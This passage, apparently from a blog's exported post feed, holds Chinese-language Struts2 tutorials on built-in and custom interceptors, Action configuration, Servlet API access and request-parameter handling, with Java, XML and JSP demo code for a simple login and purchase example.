的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox datetime 日期拦截器 profiling 通过参数激活 profile roles 确定用户是否具有 JAAS 指定的 Role，否则不予执行 annotationWorkflow 利用注解代替 XML 配置，使用 annotationWorkflow 拦截器可以使用注解，执行流程为 before-execute-feforeResult-after multiselect 检测是否有像 标签一样被选中的多个值，然后添加一个空参数 deprecation 当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode 模式中，会检查应用程序使用过时或未知的常量，并且显示警告 Struts2 框架除了提供这些有用的拦截器以外，还定义了一些拦截器栈，在开发 Web 应用时，可以直接引用这些拦截器栈，而无须自定义拦截器。 注意：随着 Struts2 版本的发展，内建拦截器的数量也在相应地增多，不同版本的 Struts2 拦截器的数量有一些差异，此版本的 Struts2 内建拦截器共有 35 个。这些内建拦截器读者不需要记忆，只需要了解即可。 内建拦截器的配置在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 &lt;interceptors&gt; 元素下的内建拦截器和拦截器栈，其部分代码如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;package name=\"struts-default\" abstract=\"true\"&gt; ... &lt;interceptors&gt; &lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt; &lt;interceptor name=\"alias\" class=\"com.opensymphony.xwork2.interceptor.AliasInterceptor\"/&gt; &lt;interceptor name=\"autowiring\" class=\"com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor\"/&gt; &lt;interceptor name=\"chain\" class=\"com.opensymphony.xwork2.interceptor.ChainingInterceptor\"/&gt; ... &lt;!-- 定义Basic stack拦截器栈 --&gt; &lt;interceptor-stack name=\"basicStack\"&gt; &lt;!--引用系统定义的exception拦截器--&gt; &lt;interceptor-ref name=\"exception\"/&gt; ... &lt;/interceptor-stack&gt; ... &lt;!-- 定义Sample model -driven stack --&gt; &lt;interceptor-stack name=\"modelDrivenStack\"&gt; &lt;!--引用系统定义的modelDriven拦截器--&gt; &lt;interceptor-ref name=\"modelDriven\"/&gt; &lt;!--引用系统定义的basicStack拦截器栈--&gt; &lt;interceptor-ref name=\"basicStack\"/&gt; &lt;/interceptor-stack&gt; ... &lt;!--定义defaultStack拦截器栈--&gt; &lt;interceptor-stack name=\"defaultStack\"&gt; &lt;interceptor-ref name=\"exception\"/&gt; &lt;interceptor-ref name=\"alias\"/&gt; &lt;interceptor-ref name=\"il8n\"/&gt; ... &lt;interceptor-ref name=\"validation\"&gt; &lt;param name=\"excludeMethods\"&gt;input,back,cancel,browse&lt;/param&gt; &lt;/interceptor-ref&gt; ... &lt;/interceptor-stack&gt; &lt;/interceptors&gt; &lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt; &lt;default-interceptor-ref name=\"defaultStack\"/&gt; &lt;!--默认action类是ActionSupport--&gt; &lt;default-class-ref class=\"com.opensymphony.xwork2.ActionSupport\" /&gt;&lt;/package&gt; 在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。 由于本节篇幅有限，这里没有列出所有的内建拦截器和拦截器栈，读者需要时可以自行查阅 struts-default.xml 文件。 0x04 自定义拦截器在实际的项目开发中，虽然 Struts2 的内建拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制和用户登录控制等），则需要通过自定义拦截器实现。 实现Interceptor接口类在 Struts2 框架中，通常开发人员所编写的自定义拦截器类都会直接或间接地实现 com.opensymphony.xwork2.interceptor.Interceptor 接口。Interceptor 接口中的主要代码如下所示： 12345public interface Interceptor extends Serializable&#123; void init(); void destroy(); String intercept(ActionInvocation invocation) throws Exception;&#125; 从上述代码中可以看出，该接口共提供了以下三个方法。 void init()：该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一次。可以在该方法中对相关资源进行必要的初始化。 void destroy()：该方法与 init() 方法相对应，在拦截器实例被销毁之前，将调用该方法释放和拦截器相关的资源，它在拦截器的生命周期内，也只被调用一次。 String intercept（ActionInvocation invocation）throws Exception：该方法是拦截器的核心方法，用于添加真正执行拦截工作的代码，实现具体的拦截操作，它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的 ActionInvocation 参数包含了被拦截的 Action 的引用，可以通过该参数的 invoke() 方法，将控制权转给下一个拦截器或者转给 Action 的 execute() 方法。 继承AbstractIntercepter抽象拦截器类除了实现 Interceptor 接口可以自定义拦截器以外，在实际开发过程中，更常用的一种方式是继承抽象拦截器类 AbstractIntercepter。 AbstractIntercepter 类实现了 Interceptor 接口，并且提供了 init() 方法和 destroy() 方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法。AbstractInterceptor 类中定义的方法如下所示： 12345public abstract class AbstractInterceptor implements Interceptor&#123; public void init()&#123;&#125; public void destroy()&#123;&#125; public abstract String intercept (ActionInvocation invocation) throws Exception;&#125; 从上述代码中可以看出，AbstractInterceptor 类已经实现了 Interceptor 接口的所有方法，一般情况下，只需继承 AbstractInterceptor 类，实现 interceptor() 方法就可以创建自定义拦截器。 需要注意的是，只有当自定义的拦截器需要打开系统资源时，才需要覆盖 AbstractInterceptor 类的 init() 方法和 destroy() 方法。与实现 Interceptor 接口相比，继承 AbstractInterceptor 类的方法更为简单。 Demo自定义拦截器实现权限控制实例。 新建一个st2test项目。 配置web.xml： 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;!-- 首页 --&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;main.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; 新建User类： 123456789101112131415161718package com.mi1k7ea.domain;public class User &#123; private String username; // 用户名 private String password; // 密码 public String getUsername() &#123; return username; &#125; public void setUsername(String username) &#123; this.username = username; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125;&#125; 新建LoginAction类，用于处理登录逻辑： 12345678910111213141516171819202122232425262728package com.mi1k7ea.action;import com.mi1k7ea.domain.User;import com.opensymphony.xwork2.ActionContext;import com.opensymphony.xwork2.ActionSupport;import com.opensymphony.xwork2.ModelDriven;public class LoginAction extends ActionSupport implements ModelDriven&lt;User&gt; &#123; private static final long serialVersionUID = -8493698886438630994L; private User user = new User(); @Override public User getModel() &#123; return user; &#125; public String execute() throws Exception &#123; // 获取ActionContext ActionContext actionContext = ActionContext.getContext(); if (\"admin\".equals(user.getUsername()) &amp;&amp; \"123456\".equals(user.getPassword())) &#123; // 将用户存储在session中 actionContext.getSession().put(\"user\", user); return SUCCESS; &#125; else &#123; actionContext.put(\"msg\", \"用户名或密码错误，请重新登录!\"); return INPUT; &#125; &#125;&#125; 新建BookAction类，商品处理类： 1234567891011package com.mi1k7ea.action;import com.opensymphony.xwork2.ActionSupport;public class BookAction extends ActionSupport &#123; private static final long serialVersionUID = 5640989517690867879L; // 购买图书 public String buy() &#123; return SUCCESS; &#125;&#125; 新建拦截器PrivilegeInterceptor类，继承AbstractInterceptor类，在intercept()函数中通过获取session中是否含有user来判断是否已登录再决定是否放行： 1234567891011121314151617181920212223package com.mi1k7ea.interceptor;import com.opensymphony.xwork2.Action;import com.opensymphony.xwork2.ActionContext;import com.opensymphony.xwork2.ActionInvocation;import com.opensymphony.xwork2.interceptor.AbstractInterceptor;public class PrivilegeInterceptor extends AbstractInterceptor &#123; private static final long serialVersionUID = 193664972753450682L; @Override public String intercept(ActionInvocation invocation) throws Exception &#123; // 得到 ActionContext ActionContext actionContext = invocation.getInvocationContext(); // 获取User对象 Object user = actionContext.getSession().get(\"user\"); if (user != null) &#123; return invocation.invoke(); // 继续向下执行 &#125; else &#123; actionContext.put(\"msg\", \"您还未登录，请先登录！\"); return Action.LOGIN; // 如果用户不存在，则返回login值 &#125; &#125;&#125; 配置struts.xml文件，此文件用于声明自定义拦截器、拦截器栈以及对book操作的Action： 123456789101112131415161718192021222324252627282930&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt;&lt;struts&gt; &lt;package name=\"struts2\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;!-- 声明拦截器 --&gt; &lt;interceptors&gt; &lt;interceptor name=\"privilege\" class=\"com.mi1k7ea.interceptor.PrivilegeInterceptor\" /&gt; &lt;interceptor-stack name=\"myStack\"&gt; &lt;interceptor-ref name=\"defaultStack\" /&gt; &lt;interceptor-ref name=\"privilege\" /&gt; &lt;/interceptor-stack&gt; &lt;/interceptors&gt; &lt;!-- 用户登录操作 --&gt; &lt;action name=\"login\" class=\"com.mi1k7ea.action.LoginAction\"&gt; &lt;result&gt;/main.jsp&lt;/result&gt; &lt;result name=\"input\"&gt;/login.jsp&lt;/result&gt; &lt;/action&gt; &lt;!-- 关于book操作 --&gt; &lt;action name=\"book_*\" class=\"com.mi1k7ea.action.BookAction\" method=\"&#123;1&#125;\"&gt; &lt;result&gt;/success.jsp&lt;/result&gt; &lt;result name=\"login\"&gt;/login.jsp&lt;/result&gt; &lt;!-- 在action中使用自定义拦截器 --&gt; &lt;interceptor-ref name=\"myStack\" /&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 新建main.jsp： 1234567891011121314151617&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; &lt;title&gt;主页&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=\"0\"&gt; &lt;tr&gt; &lt;td&gt;《SSH框架整合实战教程》&lt;/td&gt; &lt;td&gt;&lt;a href=\"/st2test/book_buy\"&gt;购买&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 新建login.jsp： 12345678910111213141516171819202122232425262728293031&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;登录&lt;/title&gt; &lt;style type=\"text/css\"&gt; input[type=text],input[type=password]&#123;width:150px&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=\"center\"&gt; &lt;form action=\"/st2test/login.action\" method=\"post\"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;label style=\"text-align:right;\"&gt;用戶名：&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"username\"&gt;&lt;/td&gt; &lt;td&gt;&lt;span style=\"color:#F00\"&gt;$&#123;requestScope.msg &#125;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;label style=\"text-align:right;\"&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=\"password\" name=\"password\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"right\" colspan=\"2\"&gt;&lt;input type=\"submit\" value=\"登录\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 新建success.jsp： 1234567891011&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;成功页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;尊敬的会员$&#123;user.username &#125;，您已成功购买商品，祝您购物愉快！&lt;/body&gt;&lt;/html&gt; 效果：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://www.mi1k7ea.com/tags/Struts2/"}]},{"title":"Struts2基础篇之Action","date":"2020-06-30T14:49:14.000Z","path":"2020/06/30/Struts2基础篇之Action/","text":"0x00 参考本笔记直接参考或引自如下链接文章： http://c.biancheng.net/struts2/ https://www.w3cschool.cn/struts_2/ 0x01 Action配置详解Action是用于处理请求操作的，它是由StrutsPrepareAndExecuteFilter分发过来的。 实现Action控制类在 Struts2 中，一个 Action 类代表一次请求或调用，每个请求的动作都对应一个相应的 Action 类。也就是说，用户的每次请求，都会转到一个相应的 Action 类中，由这个 Action 类进行处理。简而言之，Action 就是用于处理一次用户请求的对象。 实现Action接口当 Action 类处理用户请求成功后，有人习惯返回 index 字符串，有人习惯返回 success 字符串，这会导致在一个 Action 中可能会返回各种不同的值，十分不利于项目的统一管理。 为了让用户更规范地创建 Action 类，Struts2 提供了一个 Action 接口，该接口定义了 Action 类应该实现的规范，用户在创建 Action 时，可以实现这个接口。Action 接口中的具体代码如下所示： 12345678910public interface Action &#123; //定义Action接口中包含的一些结果字符串 public static final String SUCCESS=\"success\"; public static final String NONE=\"none\"; public static final String ERROR=\"error\"; public static final String INPUT=\"input\"; public static final String LOGIN=\"login\"; //定义处理用户请求的execute()方法 public String execute() throws Exception;&#125; 从上述代码中可以看出，Action 接口位于 com.opensymphony.xwork2 包中，并且接口中只定义了五个字符串常量和一个 execute() 方法。其中，execute() 方法是 Action 类的默认请求处理方法，该方法返回一个字符串，而上面五个字符串常量的作用是统一 execute() 方法的返回值。 继承ActionSupport类由于 Xwork 的 Action 接口十分简单，为开发者提供的帮助较小，所以在实际开发过程中，通常都是采用继承 ActionSupport 类的方式创建 Action。其示例代码如下所示： 1234567public class LoginAction extends ActionSupport&#123; private static final long serialVersionUID = 1L; @Override public String execute() throws Exception&#123; return super.execute(); &#125;&#125; ActionSupport 是 Action 接口的默认实现类，所以继承 ActionSupport 就相当于实现了 Action 接口。除 Action 接口以外，ActionSupport 类还实现了 Validateable、ValidationAware、TextProvider、LocaleProvider 和 Serializable 等接口，这为用户提供了更多的功能。 ActionSupport 类中提供了许多默认方法，这些默认方法包括数据校验的方法、默认的处理用户请求的方法等。如果开发者的 Action 类继承 ActionSupport 类，会大大简化 Action 的开发。 需要注意的是，由于自定义的 Action 类继承了 ActionSupport 类，因此必须定义一个变量 serialVersionUID。这是因为 ActionSupport 类实现了 Serializable 接口，任何实现了 Serializable 接口的类都必须声明变量 serialVersionUID，如下所示： 1private static final long serialVersionUID = 1L; 在学习过程中，细心的读者可能会发现，即使不加上述代码，程序也可以正常执行。但是在实际项目开发中，必须加上上述代码。 配置Action配置 Action 主要就是配置 struts.xml 文件中 Action 的映射信息。Action 映射是指将一个请求的 URL 映射到一个 Action 类，当一个请求匹配某个 Action 名称时，Struts2 框架就使用这个 Action 确定如何处理请求。 struts.xml 文件是通过 &lt;action&gt; 元素对请求的 Action 和 Action 类进行配置的，其示例代码如下所示： 123&lt;action name=\"userAction\" class=\"com.mi1k7ea.action.UserAction\" method=\"add\"&gt; ...&lt;/action&gt; 在上述代码中，包含了 &lt;action&gt; 元素的三个常用属性 name、class 和 method，这三个属性的具体说明如下表所示。 名 称 可选/必填 说 明 name 必填属性 表示 Action 的名称（该名称必须唯一），它指定了 Action 所处理请求的 URL。该属性将在其他地方被引用，如作为 JSP 页面 form 表单的 action 属性值。 class 可选属性 用于指定 Action 的实现类，如果没有指定 class 属性值，则其默认值为 com.opensymphony.xwork2.ActionSupport 类。 method 可选属性 指定请求 Action 时调用的方法。如果指定了 method 属性，则该 Action 会调用 method 属性中指定的方法，如果不指定 method 属性，则 Action 会调用 execute() 方法。 使用通配符由于在一个 Action 类中可能有多个业务逻辑处理方法，在配置 Action 时，就需要使用多个 &lt;action&gt; 元素。在实现同样功能的情况下，为了减少 struts.xml 配置文件的代码量，可以借助于通配符映射信息。 下面以一段 Action 的配置代码为例，说明如何使用通配符进行配置，如下所示： 12345&lt;package name=\"user\" namespace=\"/user\" extends=\"struts-default\"&gt; &lt;action name=\"userAction_*\" class=\"com.mi1k7ea.action.UserAction\" method=\"&#123;1&#125;\"&gt; &lt;result&gt;/index.jsp&lt;/result&gt; &lt;/action&gt;&lt;/package&gt; 在上述代码中，method 属性值中的数字1表示匹配第 1 个 *。当客户端发送 /user/userAction_login.action 这样的请求时，&lt;action&gt; 元素的 name 属性值就被设置成 userAction_login，method 属性值就被设置成 login。当客户端发送 /user/userAction_register.action 这样的请求时，&lt;action&gt; 元素的 name 属性值就被设置为 userAction_register，method 属性值也被设置成 register。 另外，对 &lt;result&gt; 元素也可以采用通配符配置，代码如下所示： 1&lt;result&gt;/(1).jsp&lt;/result&gt; 当客户端发送 userAction_login 这样的请求时，&lt;result&gt; 元素被设置成跳转到 login.jsp 页面。当客户端发送 userAction_register 这样的请求时，&lt;result&gt;元素被设置成跳转到 register.jsp 页面。 0x02 Action访问Servlet API在 Struts2 中，虽然 Action 已经与 Servlet API 完全分离，但在实现业务逻辑时，还是经常要访问 Servlet API 中的对象。 通常开发时需要访问 Servlet API 中的 HttpServletRequest、HttpSession 和 ServletContext 三个接口，它们分别对应 JSP 内置对象 request、session 和 application。 在 Struts2 中，访问 Servlet API 通常采用两种方式，分别是通过 ActionContext 访问和通过 ServletActionContext 访问，本节将针对这两种访问方式进行讲解。 通过ActionContext访问ActionContext 是 Action 执行的上下文对象，在 ActionContext 中保存了 Action 执行所需要的所有对象，包括 request、session 和 application 等。ActionContext 类访问 Servlet API 的几个常用方法如表所示。 方法声明 功能描述 void put(String key, Object value) 将 key-value 键值对放入 ActionContext 中，模拟 Servlet API 中的 HttpServletRequest 的 setAttribute() 方法 Object get(String key) 通过参数 key 查找当前 ActionContext 中的值 Map&lt;String, Object&gt; get Application() 返回一个 Application 级的 Map 对象 static ActionContext getContext() 获取当前线程的 ActionContext 对象 Map&lt;String, Object&gt; getParameters() 返回一个包含所有 HttpServletRequest 参数信息的 Map 对象 Map&lt;String, Object&gt; getSession() 返回一个 Map 类型的 HttpSession 对象 要访问 Servlet API，可以通过如下示例代码方式进行： 1234ActionContext context = ActionContext.getContext();context.put(\"name\",\"mi1k7ea\");context.getApplication().put(\"name\",\"mi1k7ea\");context.getSession().put(\"name\",\"mi1k7ea\"); 在上述示例代码中，通过 ActionContext 类中的方法调用，分别在 request、application 和 session 中放入了（”name”，”mi1k7ea”）键值对。通过代码可以看到，ActionContext 类可以非常简单地访问 JSP 内置对象的属性。 Demo沿用之前的示例项目继续演示。 添加login.jsp： 123456789101112131415161718192021&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;登录页面&lt;/title&gt; &lt;style type=\"text/css\"&gt; input[type=text],input[type=password]&#123;width:150px&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=\"center\"&gt; &lt;form action=\"login\" method=\"post\"&gt; 用户名：&lt;input type=\"text\" name=\"username\"/&gt;&lt;br/&gt; 密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=\"password\" name=\"password\"/&gt;&lt;br/&gt; &lt;input type=\"reset\" value=\"重置\"/&gt; &lt;input type=\"submit\" value=\"登录\"/&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 修改success.jsp： 1234567891011121314&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;登录成功页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;$&#123;success &#125;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;用户登录信息&lt;/h2&gt;用户名：$&#123;username &#125;&lt;br/&gt;密码：$&#123;password &#125;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt; 添加error.jsp： 1234567891011&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;登录失败页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;$&#123;error &#125;&lt;br/&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 编写LoginAction类，主要用于登录逻辑处理： 123456789101112131415161718192021222324252627282930313233343536373839package com.mi1k7ea;import com.opensymphony.xwork2.ActionContext;import com.opensymphony.xwork2.ActionSupport;public class LoginAction extends ActionSupport &#123; private String username; // 用户名 private String password; // 密码 // username的getter和setter方法 public String getUsername() &#123; return username; &#125; public void setUsername(String username) &#123; this.username = username; &#125; // password的getter和setter方法 public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; @Override public String execute() throws Exception &#123; // 获取ActionContext对象 ActionContext context = ActionContext.getContext(); if (\"admin\".equals(username) &amp;&amp; \"123456\".equals(password)) &#123; // 将用户名和密码信息放入context对象中 context.put(\"username\", username); context.put(\"password\", password); context.put(\"success\", \"用户登录成功！\"); return SUCCESS; &#125; else &#123; // 定义登录失败的错误信息 context.put(\"error\", \"用户名或密码错误，请重新登录！\"); return ERROR; &#125; &#125;&#125; 修改struts.xml： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!-- 指定 Struts2 配置文件的 DTD 信息 --&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt;&lt;!-- Struts2配置文件的根元素 --&gt;&lt;struts&gt; &lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt; &lt;package name=\"default\" extends=\"struts-default\"&gt; &lt;action name=\"login\" class=\"com.mi1k7ea.LoginAction\"&gt; &lt;result name=\"success\"&gt;/success.jsp&lt;/result&gt; &lt;result name=\"error\"&gt;/error.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 效果如图： 通过ServletActionContext访问除了通过 ActionContext 类访问 Servlet API 以外，Struts2 框架还提供了 ServletActionContext 类访问 Servlet API，该类中的方法都是静态方法，其常见方法如表所示。 方法声明 功能描述 static PageContext getPageContext() 获取 Web 应用的 PageContext 对象 static HttpServletRequest getRequest() 获取 Web 应用的 HttpServletRequest 对象 static HttpServletResponse getResponse() 获取 Web 应用的 HttpServletResponse 对象 static ServletContext getServletContext() 获取 Web 应用的 ServletContext 对象 Demo在前面项目中的 com.mi1k7ea 包下创建 MessageAction 类，编写后的代码如下所示： 1234567891011package com.mi1k7ea;import com.opensymphony.xwork2.ActionSupport;import org.apache.struts2.ServletActionContext;public class MessageAction extends ActionSupport &#123; public String execute() throws Exception&#123; ServletActionContext.getRequest().setAttribute(\"message\",\"Access Servlet API By ServletActionContext.\"); return SUCCESS; &#125;&#125; 在struts.xml的package标签内添加一个action标签： 123&lt;action name=\"message\" class=\"com.mi1k7ea.MessageAction\"&gt; &lt;result name=\"success\"&gt;/message.jsp&lt;/result&gt;&lt;/action&gt; 创建message.jsp： 1&lt;div align=\"center\"&gt;$&#123;requestScope.message &#125;&lt;/div&gt; 运行效果： 0x03 Action处理请求参数在 Struts2 框架中，页面的请求数据和 Action 有两种基本的对应方式，分别是字段驱动（FieldDriven，也称为属性驱动）方式和模型驱动（ModelDriver）方式。 属性驱动属性驱动是指在 Action 中通过字段属性进行与页面之间的数据传递，通常使用时会包括两种情况：一种是与基本数据类型的属性对应，另一种是直接使用域对象。 基本数据类型字段驱动方式的数据传递在 Struts2 中，可以直接在 Action 中定义各种 Java 基本数据类型的字段，使这些字段与表单数据相对应，并利用这些字段进行数据传递，如下面的代码所示： 12345678public class UserAction extends ActionSupport &#123; private String username; // 用户名 private String password; // 密码 // 此处省略两个属性的getter和setter方法 private String execute() throws Exception &#123; return SUCCESS; &#125;&#125; 在上述 Action 类的代码中，定义了两个字符串字段 username 和 password，这两个字段分别用于对应页面上的用户名和密码这两个表单域。 直接使用域对象字段驱动方式的数据传递在基本数据类型字段驱动方式中，如果传入的数据很多，那么 Action 的属性也会变得很多，再加上属性对应的 getter/setter 方法，势必会导致 Action 非常臃肿。 为了解决这一问题，我们可以把属性的 getter/setter 方法从 Action 中提取出来单独作为一个域对象，并在相应的 Action 中直接使用这个域对象。此种方式中的域对象一般以 JavaBean 的形式实现，JavaBean 中所封装的属性要和页面中表单的属性一一对应。此时 JavaBean 将成为数据传递的载体，并可以在其他 Action 中使用。 Demo参考：http://c.biancheng.net/view/4095.html 模型驱动在 Struts2 中，Action 还有另外一种方式处理请求参数，称为模型驱动（ModelDriven）。 模型驱动方式要求 Action 需要通过实现 ModelDriven 接口接收请求参数，并且要重写 getModel() 方法。getModel() 方法返回的就是 Action 所使用的数据模型对象。 与属性驱动中直接使用域对象字段驱动方式的数据传递类似，模型驱动方式也是通过 JavaBean 模型进行数据传递的。只要是普通的 JavaBean，就可以充当模型部分，并且 JavaBean 中所封装的属性要与表单的属性一一对应，JavaBean 就是数据传递的载体。 使用模型驱动方式时，Action 类中通过 getModel() 方法获取模型，其示例代码如下所示： 12345678910111213package com.mi1k7ea;import com.mi1k7ea.User;import com.opensymphony.xwork2.ActionSupport;import com.opensymphony.xwork2.ModelDriven;public class LoginAction extends ActionSupport implements ModelDriven&lt;User&gt; &#123; private User user = new User(); public User getModel() &#123; return user; &#125; public String execute() throws Exception &#123; return SUCCESS; &#125;&#125; 使用模型驱动时，其对应的表单页面也要做相应调整，调整后的代码片段如下所示： 12345&lt;form action=\"loginAction\" method=\"post\" name=\"form1\"&gt; 用户名：&lt;input type=\"text\" name=\"username\"/&gt;&lt;br/&gt; 密码：&lt;input type=\"password\" name=\"password\"/&gt;&lt;br/&gt; &lt;input type=\"submit\" value=\"登录\"/&gt;&lt;/form&gt; 从上述代码中可以看出，使用 ModelDriver 的方式后，表单中的文本域名称已经不需要添加 user 前缀，页面上的 username 会自动对应到这个 Model 的 username 属性。 与属性驱动相比，模型驱动不需要在 Action 类中定义与表单元素一一对应的所有属性及其各属性的 getter 和 setter 方法，这减少了 Action 类中的代码量。在项目应用中具体使用哪种驱动方法，现给出以下几点建议。 要统一整个系统中 Action 的驱动方法，即要么都使用属性驱动，要么都使用模型驱动。 如果持久层对象与表单中的属性是一一对应的关系，那么建议使用模型驱动，因为模型驱动方法使 Action 类中的代码更加整洁。 如果持久层对象与表单中的属性不是一一对应的关系，那么建议使用属性驱动，因为不是一一对应的关系时，系统中需要提供两个 JavaBean（一个对应表单提交的数据，一个用于持久层对象）。 总之，属性驱动的方法和模型驱动的方法各有优缺点，在实际开发中，需要根据项目实际情况选择使用哪种驱动方式。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://www.mi1k7ea.com/tags/Struts2/"}]},{"title":"Struts2基础篇之基本概念","date":"2020-06-27T07:53:24.000Z","path":"2020/06/27/Struts2基础篇之基本概念/","text":"0x00 参考本笔记直接参考或引自如下链接文章： http://c.biancheng.net/struts2/ https://www.w3cschool.cn/struts_2/ 0x01 Struts2简介Struts2 是 Apache 软件组织推出的一个基于 MVC 模式的轻量级 Web 框架，自问世以来，就受到了广大 Web 开发者的欢迎。目前，Struts2 在 Java Web 开发领域中已占据了十分重要的地位。 目前为止，Struts 框架拥有两个主要版本：Struts1.x 和 Struts2.x。Struts1 是最早的基于 MVC 模式的轻量级 Web 框架，它能够合理划分代码结构，并包含验证框架、国际化框架等多种实用工具框架。 随着技术的不断进步，Struts1 的局限性也越来越多地暴露出来。为了符合更加灵活、高效的开发需求，Struts2 框架应运而生，并在逐渐取代 Struts1 框架。 Struts2 是在 Struts1 和 WebWork 技术（WebWork 是由 OpenSymphony 组织开发的、致力于组件化和代码重用的 J2EE Web 框架，它也是一个 MVC 框架）的基础上进行合并后的全新框架。 虽然 Struts2 的名字与 Struts1 相似，但其设计思想有很大不同，因为 Struts2 是以 WebWork 为核心的，它是 WebWork 技术与 Struts1 技术的结合，所以 Struts2 可以理解为 WebWork 的更新产品。 Struts2的优点如下： 